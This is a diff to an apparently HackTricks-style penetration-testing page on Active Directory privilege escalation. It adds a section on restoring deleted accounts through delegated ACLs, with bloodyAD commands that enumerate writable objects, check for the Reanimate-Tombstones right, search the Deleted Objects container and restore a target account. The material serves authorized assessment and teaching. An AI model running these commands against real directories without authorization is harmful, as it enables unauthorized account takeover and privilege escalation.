@@ -66,6 +66,19 @@ Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
   Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
 ```
 
+### Reanimating a deleted account through delegated ACLs
+
+An ACL tool's `WRITE` result for a deleted account is a lead, not proof that all undelete permissions are effective.<sup>[[18]](#references)</sup> Inspect the deleted object's ACL and `lastKnownParent` directly; BloodHound paths may omit deleted-object ACLs.<sup>[[19]](#references)</sup> A restored account can retain its password hash, but restoring it does not disclose the password or grant password-reset rights. Authentication still requires a valid credential.<sup>[[19]](#references)</sup>
+
+To enumerate hidden deleted accounts and confirm the reanimation right from Linux, use `bloodyAD` with the recycled-object and deactivated-link LDAP controls. Then restore the chosen account by its `sAMAccountName`. Replace the example domain, host, and identity with the assessed environment; verify the target DN and `lastKnownParent` before the write.<sup>[[19]](#references)</sup>
+
+```bash
+bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get writable
+bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get object 'DC=example,DC=local' --attr nTSecurityDescriptor --resolve-sd | grep -i Reanimate-Tombstones
+bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --base 'CN=Deleted Objects,DC=example,DC=local' --filter '(sAMAccountName=*)' --attr sAMAccountName,lastKnownParent,objectSid
+bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' set restore target.user
+```
+
 ### Domain Controller Access
 
 Access to files on the DC is restricted unless the user is part of the `Server Operators` group, which changes the level of access.
@@ -389,5 +402,7 @@ If a service ACL gives this group change/start rights, point the service at an a
 - [15] [Lab of a Penetration Tester – Abusing DnsAdmins Privilege for Escalation in Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
 - [16] [BloodHound – GenericAll edge abuse information](https://bloodhound.specterops.io/resources/edges/generic-all)
 - [17] [Undocumented NT Internals – NtLoadDriver function (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
+- [18] [MS-ADTS - Undelete authorization rules](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004)
+- [19] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
 
 {{#include ../../banners/hacktricks-training.md}}
